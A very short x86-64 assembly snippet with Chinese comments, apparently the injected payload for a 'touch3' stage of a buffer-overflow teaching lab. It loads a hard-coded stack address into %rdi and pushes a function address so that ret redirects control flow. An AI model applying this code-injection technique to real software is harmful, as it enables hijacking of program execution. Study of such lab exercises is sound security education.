add $0x9,%rsp          # 加9个字节，给string留空间
mov $0x5561dc78,%rdi   # rdi指向内存地址
pushq $0x4018fa         # touch3地址
ret 


